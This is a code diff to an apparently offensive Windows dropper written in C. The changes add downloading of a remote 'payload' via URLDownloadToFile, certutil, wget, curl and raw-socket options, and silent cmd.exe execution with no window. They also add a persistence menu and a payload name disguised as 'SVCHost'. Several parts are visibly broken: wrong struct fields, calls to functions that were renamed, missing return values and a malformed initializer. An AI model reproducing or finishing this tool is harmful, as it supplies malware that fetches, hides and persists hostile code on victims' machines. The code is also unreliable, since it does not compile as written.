@@ -1,9 +1,13 @@
+#include <windows.h>
+#include <stdlib.h>
 #include <ctype.h>
+#include <urlmon.h>
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
-#include <windows.h>
 #include <stdarg.h>
+
+#pragma comment(lib, "urlmon.lib")
 
 #define PERS_NAME "SVCHost"
 #define MAX_URL 2048
@@ -27,6 +31,11 @@ typedef struct _WRITABLE_DIR {
     char path[MAX_PATH + 1];
 } WRITABLE_DIR, *PWRITABLE_DIR;
 
+typedef struct _DOWNLOAD_CONTEXT {
+    char *sourceUrl;
+    char *targetPath;
+} DOWNLOAD_CONTEXT, *PDOWNLOAD_CONTEXT;
+
 static BOOL printHelp = TRUE;
 
 VOID _ListOpts(const char *str, ...) {
@@ -49,6 +58,59 @@ VOID _ListOpts(const char *str, ...) {
     va_end(arg);
 }
 
+BOOL ExecuteCommand(const char* command) {
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+
+    int commandLen = strlen(command);
+    char execCmdCopy[commandLen + 16];
+    const char* cmd = "cmd.exe /C ";
+
+    int cmdLen = strlen(cmd);
+    memcpy(execCmdCopy, cmd, cmdLen);
+
+    memcpy(execCmdCopy + cmdLen, command, commandLen);
+    execCmdCopy[cmdLen + commandLen] = '\0';
+
+    printf("[!] Executing: %s\n", execCmdCopy);
+
+    BOOL rc = CreateProcessA(
+        NULL,
+        (LPSTR) execCmdCopy,
+        NULL, NULL, FALSE,
+        CREATE_NO_WINDOW,
+        NULL, NULL,
+        &si, &pi
+    );
+
+    if (rc == FALSE) {
+        TranslateErrorPrint(GetLastError());
+        return FALSE;
+    }
+    
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Check exit exit code
+    DWORD exitCode = 0;
+    if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
+        TranslateErrorPrint(GetLastError());
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    
+    if (exitCode != 0) {
+        printf("[-] Command failed to execute (%lu). Try another option.\n", exitCode);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
 BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data) {
     int rc;
 
@@ -57,13 +119,22 @@ BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, Valid
         fflush(stdout);
         fgets(buffer, (int)bufferSize, stdin);
         buffer[strcspn(buffer, "\n")] = '\0';
-        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0) {
+        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") || strcmp(buffer, "no") || strcmp(buffer, "n") == 0) {
                 printf("[*] Exiting...\n");
                 return FALSE;
         }
-        if (strcmp(buffer, "h") == 0) {
+        if (validator && strcmp(buffer, "h") == 0) {
             printHelp = TRUE;
         }
+        
+        if (!validator) {
+            if (strcmp(buffer, "y") == 0 || strcmp(buffer, "yes") == 0) {
+                return TRUE;
+            }
+            continue;   
+        }
+
+        
 
         rc = validator(buffer, data);
         if (rc == WIN_ERROR) {
@@ -132,18 +203,52 @@ BOOL IsExecutable(const char *path) {
 	return TRUE;
 }
 
-BOOL DownloadFromUrl(const char* source) {
-    printf("[+] Downloading the payload using Win32 API\n");
-    return FALSE;
+BOOL DownloadUsingWin32(const PDOWNLOAD_CONTEXT pDc) {
+    printf("[*] Downloading the payload using Win32 API\n");
+
+    HRESULT hResult = URLDownloadToFile(
+        NULL,
+        pDc->sourceUrl,
+        pDc->targetDir,
+        0, NULL
+    );
+
+    if (hResult != S_OK) {
+        switch(hResult) {
+            case INET_E_RESOURCE_NOT_FOUND:
+                fprintf(stderr, "[-] No internet connection.\n");
+                break;
+            case INET_E_INVALID_URL:
+                fprintf(stderr, "[-] Invalid URL.\n");
+                break;
+            case INET_E_DOWNLOAD_FAILURE:
+                fprintf(stderr, "[-] Cannot write to destination path.\n");
+                break;
+            default:
+                fprintf(stderr, "[-] Unknown error. HRESULT: 0x%08lX\n", hResult);
+            }
+    }
 }
 
-BOOL DownloadWget(const char *source) {
-    printf("[+] Downloading the payload using wget\n");
-    return TRUE;
+BOOL DownloadUsingCertutil(const PDOWNLOAD_CONTEXT pDc) {
+    printf("[*] Downloading the payload using certutil.exe\n");
+}
+
+BOOL DownloadUsingWget(const PDOWNLOAD_CONTEXT pDc) {
+    printf("[*] Downloading the payload using wget\n");
+}
+
+BOOL DownloadUsingCurl(const PDOWNLOAD_CONTEXT pDc) {
+    printf("[*] Downloading the payload using curl\n");
+}
+
+BOOL DownloadUsingTCPSocket(const PDOWNLOAD_CONTEXT pDc) {
+    printf("[*] Downloading the payload using raw TCP sockets\n");
 }
 
 int HandleDownload(char* opt, void *data) {
-    char *src = (char*) data;
+    PDOWNLOAD_CONTEXT pDownloadContext = (PDOWNLOAD_CONTEXT) data;
+    
     if (printHelp) {
         ListOpts(
             "Download using Win32 API", 
@@ -160,14 +265,14 @@ int HandleDownload(char* opt, void *data) {
         case '0':
            break; 
         case '1':
-            if (!DownloadFromUrl(src)) {
+            if (!DownloadFromUrl(pDownloadContext)) {
                 return FAIL_ERROR;
             }
             return SUCCESS;
         case '2':
             break;
         case '3':
-            if (!DownloadWget(src)) {
+            if (!DownloadWget(pDownloadContext)) {
                 return FAIL_ERROR;
             }
             return SUCCESS;
@@ -177,8 +282,7 @@ int HandleDownload(char* opt, void *data) {
             break;
         default:
             printf("[?] Unknown option specified. Select <h> for available options\n");
-            return -1;
-            break;
+            return CONTINUE_ERROR;
     }
 }
 
@@ -330,8 +434,8 @@ BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *ex
 }
 
 int main(int argc, char* argv[]) {
-	char malwareFull[MAX_PATH];
-	int malwareFullLen;
+	char payloadFull[MAX_PATH]; // How it will be saved inside the machine
+	int payloadFullLen;
 	char exe[MAX_FILE + 1];
     char ip[256];
     char target[MAX_FILE + 1];
@@ -348,7 +452,7 @@ int main(int argc, char* argv[]) {
 
     WRITABLE_DIR *wdirs = NULL;
     int capacity = 16, count = 0;
-
+    
 	if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port) == FALSE) {
         printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>]\n", argv[0]);
 		exit(1);
@@ -362,12 +466,25 @@ int main(int argc, char* argv[]) {
         exit(1); 
     }
     printf("[+] Payload will be dropped to %s\n", targetDir);
+
+    snprintf(payloadFull, payloadFullLen, "%s\\%s", targetDir, target);
+    
+    // Check if file exists
+    if (FileExists(targetDir)) {
+        if (!PromptUntilValid("Overwrite(y/n)", opt, sizeof(opt), NULL, NULL)) {
+            exit(1);
+        }
+    }
+
+    DOWNLOAD_CONTEXT downloadContext = {
+        .sourceUrl = source;
+    }
     printf("\n\n[*] **DOWNLOAD OPTION**\n\n"); 
     HandleDownload(NULL, NULL);
-    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, source)) {
+    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, (PDOWNLOAD_CONTEXT) &downloadContext)) {
         exit(1);
     }
-    printf("\n\n[*] **PERSISTENCE OPTION**\n\n"); 
+    printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n"); 
 /*
 	if (!FileExists(malware)) {
 	    printf("[-] The malware does not exists\n");
